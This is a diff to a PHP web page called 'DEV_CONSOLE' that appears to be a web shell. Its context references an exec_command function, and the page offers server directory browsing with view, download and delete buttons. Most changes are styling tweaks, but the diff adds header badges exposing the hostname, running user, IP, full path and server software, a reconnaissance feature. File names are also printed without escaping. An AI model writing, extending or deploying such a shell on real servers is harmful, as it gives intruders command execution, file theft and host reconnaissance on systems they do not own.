@@ -88,18 +88,18 @@ function exec_command($cmd, $mode, $cwd) {
         :root { --bg: #0f172a; --panel: #1e293b; --accent: #6366f1; --text: #f1f5f9; --green: #10b981; }
         body { margin:0; font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); height:100vh; display:flex; flex-direction: column; }
         header { background: var(--panel); padding: 10px 20px; border-bottom: 1px solid #334155; display:flex; justify-content: space-between; align-items: center; }
-        .badge { background: #334155; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-family: monospace; margin-left: 5px; color: var(--green); }
+        .badge { background: #334155; padding: 4px 10px; border-radius: 4px; font-size: 14px; font-family: monospace; margin-left: 5px; color: var(--green); }
         
         main { flex: 1; display: flex; gap: 15px; padding: 15px; overflow: hidden; }
         section { background: var(--panel); border-radius: 8px; padding: 15px; border: 1px solid #334155; overflow-y: auto; }
         
         #files { flex: 1.2; }
-        table { width: 100%; border-collapse: collapse; font-family: monospace; font-size: 13px; }
+        table { width: 100%; border-collapse: collapse; font-family: monospace; font-size: 15px; }
         th { text-align: left; padding: 10px; border-bottom: 2px solid #334155; color: #94a3b8; }
         td { padding: 8px 10px; border-bottom: 1px solid #334155; }
         tr:hover { background: #2d3748; }
         
-        .btn { text-decoration: none; padding: 3px 7px; border-radius: 3px; font-size: 11px; color: #fff; }
+        .btn { text-decoration: none; padding: 3px 7px; border-radius: 3px; font-size: 13px; color: #fff; }
         .btn-v { background: #3b82f6; } .btn-d { background: #10b981; } .btn-del { background: #ef4444; }
         .folder { color: #f59e0b; text-decoration: none; font-weight: bold; }
 
@@ -114,11 +114,13 @@ function exec_command($cmd, $mode, $cwd) {
 <body>
 
 <header>
-    <strong>⚡ DEV_CONSOLE</strong>
+  <div style="font-size:20px; padding:5px 0"><strong><a href="<?=$_SERVER['PHP_SELF']?>" style="color:#fff;text-decoration:none;">⚡ DEV_CONSOLE</a></strong></div>
     <div>
-        <span class="badge">OS: <?php echo PHP_OS; ?></span>
-        <span class="badge">IP: <?php echo get_ip(); ?></span>
-        <span class="badge">User: <?php echo get_current_user(); ?></span>
+    	<span class="badge">Hostname: <?php echo gethostname(); ?></span>
+    	<span class="badge">User: <?php echo get_current_user(); ?></span>
+        <span class="badge">IP: <?php echo gethostbyname(gethostname()); ?></span>
+        <span class="badge" title="Full Path">Path: <?php echo realpath($cwd); ?></span>
+        <span class="badge">Srv: <?php echo explode(' ', $_SERVER['SERVER_SOFTWARE'])[0]; ?></span>
     </div>
 </header>
 
@@ -132,14 +134,14 @@ function exec_command($cmd, $mode, $cwd) {
             </form>
         </div>
         <table>
-            <thead><tr><th>Name</th><th>Size</th><th>Actions</th></tr></thead>
+            <thead><tr><th>Name</th><th>Size</th><th style="text-align:center">Actions</th></tr></thead>
             <tbody>
                 <tr><td colspan="3"><a href="?dir=<?php echo urlencode(dirname($cwd)); ?>" class="folder">.. / Parent Directory</a></td></tr>
                 <?php foreach(scandir($cwd) as $f): if($f=='.' || $f=='..') continue; $p=$cwd.DIRECTORY_SEPARATOR.$f; $d=is_dir($p); ?>
                 <tr>
                     <td><?php echo $d ? "<a href='?dir=".urlencode($p)."' class='folder'>$f</a>" : "📄 $f"; ?></td>
                     <td><?php echo $d ? 'DIR' : round(filesize($p)/1024, 2).' KB'; ?></td>
-                    <td>
+                    <td style="text-align:center">
                         <?php if(!$d): ?>
                             <a href="?view=<?php echo urlencode($p); ?>" target="_blank" class="btn btn-v">View</a>
                             <a href="?download=<?php echo urlencode($p); ?>" class="btn btn-d">Get</a>
